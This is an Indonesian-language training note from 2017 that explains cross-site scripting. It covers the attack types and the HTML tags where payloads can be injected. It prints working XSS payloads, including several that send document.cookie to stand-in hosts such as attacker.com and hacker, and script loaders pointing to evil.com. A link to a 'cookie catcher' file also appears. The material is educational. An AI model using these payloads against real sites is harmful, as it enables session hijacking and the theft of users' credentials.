__/\\\________/\\\_____/\\\\\\\\\\\____/\\\___________________/\\\\\__________/\\\\\\\\\\\___        
 _\/\\\_____/\\\//____/\\\/////////\\\_\/\\\_________________/\\\///\\\______/\\\/////////\\\_       
  _\/\\\__/\\\//______\//\\\______\///__\/\\\_______________/\\\/__\///\\\___\//\\\______\///__      
   _\/\\\\\\//\\\_______\////\\\_________\/\\\______________/\\\______\//\\\___\////\\\_________     
    _\/\\\//_\//\\\_________\////\\\______\/\\\_____________\/\\\_______\/\\\______\////\\\______    
     _\/\\\____\//\\\___________\////\\\___\/\\\_____________\//\\\______/\\\__________\////\\\___   
      _\/\\\_____\//\\\___/\\\______\//\\\__\/\\\______________\///\\\__/\\\_____/\\\______\//\\\__  
       _\/\\\______\//\\\_\///\\\\\\\\\\\/___\/\\\\\\\\\\\\\\\____\///\\\\\/_____\///\\\\\\\\\\\/___ 
        _\///________\///____\///////////_____\///////////////_______\/////_________\///////////_____

CATATAN PELATIHAN KSLOS 11/10/2017, XSS.txt
Latihan XX : XSS (Cross-Site Scripting) dan XSS Injection

Apa itu XSS ?
Cross-site Scripting (XSS) adalah serangan code injection yang memungkinkan attacker mengeksekusi JavaScript ke dalam browser user lainnya atau bahkan admin dari website tersebut.

Dalam XSS attacker tidak langsung menyerang targetnya, melainkan dia melakukan exploitasi tentang kerentanan dari website yang dikunjungi oleh korbannya, agar website dapat melanjutkan JavaScript ke korban. Untuk browser korban, JavaScript yang berbahaya akan terlihat seperti bagian dari website.

Bagaimana JavaScript yang berbahaya dapat dikirim ?
Satu-satunya cara agar ataccker dapat menjalankan JavaScript buatannya di dalam browser korban adalah dengan menginjeksikannya ke salah satu halaman dimana korban sering melakukan download dari website tersebut. Ini bisa terjadi jika website tersebut mengandung unsur input dari user, karena attacker dapat menyisipkan string yang akan dikira sebagai code dari browser korban.

Contoh :
print "<html>"
print "Latest comment:"
print database.latestComment
print "<html>"

Script akan mengasumsikan komentar hanya berisikan text saja. Tetapi, karena user input akan dimasukan secara langsung, attacker dapat memasukan komentar berupa "script>...</script>". Semua user saat mengunjungi halaman akan mendapatkan respon berikut :

<html>
Latest comment:
<script>...</script>
</html>

Ketika halaman browser dari user telah selesai load halaman, maka akan mengeksekusi semua code JavaScript yang yang berada di dalam tag <script>. 

Bahaya dari JavaScript :
- Cookie Theft
Attacker akan mengambil cookie dari korban yang berhubungan dengan website tersebut menggunakan document.cookie, dan meng-inject data cookie tersebut ke website agar attacker tidak perlu untuk login lagi untuk menggunakan account korban, karena cookie mengandung informasi-informasi sensitif seperti session ID, username & password session, dan lain-lainnya.
- Keylogging
Attacker dapat mendaftarkan keyboard event listener menggunakan addEventListener dan mengirimnya ke semua user yang berada pada servernya, yang berpotensial untuk merekam semua informasi sensitif seperti password dan juga nomor credit card.
-Phishing
Attacker dapat membuat sebuah halaman form palsu yang menggunakan manipulasi DOM, dimana atribut action akan di set untuk mengirim ke servernya, dan menipu korban untuk memasukan informasi-informasi sensitif.

Contoh attack scenario XSS :
Dalam contoh ini, kita mengasumsikan bahwa tujuan utama dari attacker adalah mencuri cookie dari korban dengan memanfaatkan XSS vulnerability yang ada di website. Ini dapat dilakukan dengan menggunakan HTML code berikut ini :

<script>
window.location='http://attacker/?cookie='+document.cookie
</script>

Macam - macam serangan XSS :
- Persistent XSS
Dalam persistent XSS, attacker akan mengirim sebuah script ke website yang dimana website tersebut akan menyimpannya dan menjalankannya setiap ada user yang melihat halaman tersebut, contohnya halaman komentar pada web yang mendukung javascript.

- Reflected XSS
Dalam reflected XSS, attacker akan mengirim string berbahaya tambahan pada address ke user. Lalu website akan memasukan string berbahaya ini sebagai respon dan mengirimnya kembali ke user.
Contoh :
Pertama attacker
http://website//search?keyword=<script>window.location='http://attacker.com/?cookie=' +document.cookie</script>
Korban akan membukanya dan mengirim alamat tersebut ke browser yang dimana website akan mengambil cookie dari user tersebut dikarenakan ada perintah document.cookie, dan langsung mengirimnya ke website attacker.com

- DOM-based XSS
DOM-based XSS adalah gabungan antara Persistent dan Reflected XSS. dimana akan dilakukan Reflected XSS terlebih dahulu dengan mengirim string berbahaya dan dilanjutkan dengan Persistent XSS yang akan menyimpan string berbahaya tersebut pada website.

XSS dapat di-inject dibeberapa tempat :
	- Tag <script>
	Tag <script> adalah yang paling terlihat untuk dimasukan payload XSS. 
	Tag script sendiri dibagi menjadi 2 yaitu :
	
	<!-- External script -->
	<script src=http://evil.com/xss.js></script>
	<!-- Embedded script -->
	<script> alert("XSS"); </script>
	
	- Tag <body>
	Payload XSS dapat di-inject juga di dalam tag <body> dengan menggunakan 
	atribut onload atau atribut yang tidak terlihat lainnya seperti background.
	
	<!-- onload attribute -->
	<body onload=alert("XSS")>
	<!-- background attribute -->
	<body background="javascript:alert("XSS")">
	
	- Tag <img>
	Beberapa browser akan menjalankan javascript juga menemukan tag <img>

	<!-- <img> tag XSS -->
	<img src="javascript:alert("XSS");">
	<!--  tag XSS using lesser-known attributes -->
	<img dynsrc="javascript:alert('XSS')">
	<img lowsrc="javascript:alert('XSS')">
	Ada juga yang menggunakan elemen onerror pada tags yang ada didalam tag-tag html 
	<!-- <img> attribute onerror -->
	Contohnya :
	<img src="gmbr.jpg" onerror="javascript:alert('XSS')">
	
	- Tag <iframe>

	Tag <iframe> akan membuat sebuah halaman HTML di dalam halaman HTML tersebut (mini website).
	IFrame dapat berisi Javascript, tetapi javascript yang ada di dalam IFrame tidak dapat mengakses
	DOM yang ada di dalam website utama, dikarenakan Content Security Policy (CSP).
	Meskipun begitu IFrame sangatlah efektif untuk melakukan serangan phising.

	<!-- <iframe> tag XSS -->
	<iframe src=”http://evil.com/xss.html”>

	- Tag <input>
	Di beberapa browser, jika tipe atribut dari tag <input> di set menjadi image,
	Dapat di masukan script di dalamnya. 

	<!-- <input> tag XSS -->
	<input type="image" src="javascript:alert('XSS');">
	<link> tag

	- Tag <link>
	Sering digunakan untuk menghubungkan ke external style sheet, dapat juga dimasukan script di dalamnya.

	<!-- <link> tag XSS -->
	<link rel="stylesheet" href="javascript:alert('XSS');">
	
	- Tag <table>
	atribut background pada tabel dan tag <td> dapat di exploit untuk menuju ke script bukan ke image.

	<!-- <table> tag XSS -->
	<table background="javascript:alert('XSS')">
	<!-- <td> tag XSS -->
	<td background="javascript:alert('XSS')">
	<div> tag

	- Tag <div>
	Sama seperti tag <table> dan <td> yang dapat menggunakan atribut background,
	Oleh karena itu dapat dimasukan script juga di dalamnya.

	<!-- <div> tag XSS -->
	<div style="background-image: url(javascript:alert('XSS'))">
	<!-- <div> tag XSS -->
	<div style="width: expression(alert('XSS'));">
	<object> tag

	- Tag <object>
	Dapat digunakan untuk memasukan script yang telah ada pada website lainnya.

	<!-- <object> tag XSS -->
	<object type="text/x-scriptlet" data="http://hacker.com/xss.html"

	- Load JavaScript
	
	<!-- load app.js>
	http://example.com/frame#data:text/javascript, alert('XSS')
-----------------------------------------------------------------------
XSS Examples

Example 1.
Untuk contoh, kita mempunyai code HTML snippet:
<title>Example document: %(title)</title>
saat kita memasukan maka akan dihasilkan value dari code html diatas dengan browser:
<title>Example document: XSS Doc</title>
Situs yang mempunyai search field tidak mempunyai input yang di flter. Dengan membuat query pencarian untuk mencari sesuatu:
"><SCRIPT>var+img=new+Image();img.src="http://hacker/"%20+%20document.cookie;</SCRIPT>
saat administrator mengklik link yang kita punya, maka kita dapat mendapatkan cookies session dari administrator tersebut.

Example 2.
Misalkan ada url di Google sebagai berikut: http://www.google.com/search?q=flowers, yang akan mengembalikan Document HTML dengan fragment <p>Your search for 'flowers' returned the following results:</p>
i.e., nilai dari parameter query q saat dimasukan kedalam halaman akan dikembalikan oleh Google. Dimana data tersebut tidak di validasi, filter, ataupun terhapus.
Evil.org dapat menaruh script yang dimana isinya akan dimasukan ke dalam browser yang tak terlihat (iframe) contoh :
http://www.google.com/search?q=flowers+%3Cscript%3Eevil_script()%3C/script%3E

Ketika korban membuka halaman dari www.evil.org, browser akan membuka iframe dari URL diatas. Document yang dibuka ke dalam iframe akan mempunyai framgent
<p>Your search for 'flowers <script>evil_script()</script>'
returned the following results:</p>
Membuka halaman ini akan menyebabkan browser untuk menjalankan fungsi dari evil_script(). Lalu script ini akan dieksekusi didalam konteks dari page www.google.com


Referensi :
https://excess-xss.com/
https://www.acunetix.com/websitesecurity/cross-site-scripting/
https://www.acunetix.com/websitesecurity/xss/
https://www.veracode.com/security/xss
https://tipstrickshack.blogspot.co.id/2012/10/how-to-do-xss-attack-on-website.html
https://html-xhtml-css.wonderhowto.com/how-to/hack-websites-using-cross-site-scripting-xss-160706/
https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
https://www.owasp.org/index.php/Testing_for_Cross_site_scripting

Game :
https://xss-game.appspot.com/
http://www.insecurelabs.org/
http://www.insecurelabs.org/task/

Misc :
https://www.4shared.com/file/oCnEgaDr/cookie_catcher.html

